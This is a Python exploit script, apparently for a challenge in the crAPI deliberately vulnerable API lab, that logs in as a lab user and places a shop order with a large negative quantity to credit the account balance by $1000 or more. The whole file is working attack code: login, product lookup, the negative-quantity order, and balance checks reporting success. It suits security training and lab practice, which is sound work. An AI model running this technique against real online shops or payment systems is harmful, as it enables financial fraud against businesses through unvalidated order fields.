#!/usr/bin/env python3
"""Challenge 9: Increase balance by $1000+ (Mass Assignment)"""
import argparse, sys
from pathlib import Path
from typing import Optional, List, Dict, Any
import requests, yaml

def load_config(path: str) -> dict:
    with open(path, "r") as f:
        return yaml.safe_load(f)

def login(base_url: str, email: str, password: str, timeout: float = 15) -> Optional[str]:
    try:
        r = requests.post(f"{base_url.rstrip('/')}/identity/api/auth/login",
                         json={"email": email, "password": password}, timeout=timeout)
        return r.json().get("token") or r.json().get("access_token")
    except:
        return None

def get_products(base_url: str, token: str, timeout: float = 15) -> List[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        r = requests.get(f"{base_url.rstrip('/')}/workshop/api/shop/products",
                        headers=headers, timeout=timeout).json()
        return r.get("products") or []
    except:
        return []

def get_dashboard(base_url: str, token: str, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    try:
        return requests.get(f"{base_url.rstrip('/')}/identity/api/v2/user/dashboard",
                           headers=headers, timeout=timeout).json()
    except:
        return None

def place_order(base_url: str, token: str, product_id: int, quantity: int, timeout: float = 15) -> Optional[Dict[str, Any]]:
    headers = {"Authorization": f"Bearer {token}"}
    payload = {"product_id": product_id, "quantity": quantity}
    try:
        return requests.post(f"{base_url.rstrip('/')}/workshop/api/shop/orders",
                            json=payload, headers=headers, timeout=timeout).json()
    except:
        return None

def main():
    parser = argparse.ArgumentParser(description="Challenge 9: Mass Assignment - $1000+ Balance")
    parser.add_argument("--config", default="../crapi_config.yaml")
    parser.add_argument("--user-email", default="mike1@my.lab")
    parser.add_argument("--quantity", type=int, default=-100)
    args = parser.parse_args()

    cfg = load_config(Path(args.config))
    base_url = cfg["target"]["base_url"]
    password = cfg["known_users"]["password"]

    print(f"[*] Challenge 9: Mass Assignment - $1000+ Balance\n[*] Target: {base_url}\n" + "-"*60)

    token = login(base_url, args.user_email, password)
    if not token:
        print("[!] Login failed"); sys.exit(1)
    print("[+] Logged in")

    dashboard = get_dashboard(base_url, token)
    balance_before = dashboard.get("balance") or 0 if dashboard else 0
    print(f"[+] Initial balance: ${balance_before}")

    products = get_products(base_url, token)
    if not products:
        print("[!] No products found"); sys.exit(1)

    product = products[0]
    product_id = product.get("id")
    price = product.get("price")
    print(f"[+] Product: {product.get('name')} (Price: ${price})")
    print(f"[*] Expected credit: ${abs(args.quantity) * price}")

    print(f"\n[*] Mass Assignment: Large negative quantity ({args.quantity})...")
    order = place_order(base_url, token, product_id, args.quantity)

    if order:
        dashboard = get_dashboard(base_url, token)
        balance_after = dashboard.get("balance") or 0 if dashboard else 0
        change = balance_after - balance_before
        print(f"[+] Order placed!")
        print(f"[+] Balance: ${balance_after} (change: +${change})")
        if change >= 1000:
            print(f"[!] SUCCESS! Increased balance by ${change} (>= $1000)")
            print(f"[!] VULNERABLE: Mass Assignment via large negative quantity")
        else:
            print(f"[!] Increase was ${change} (need $1000+)")
    else:
        print("[!] Order failed")

if __name__ == "__main__":
    main()
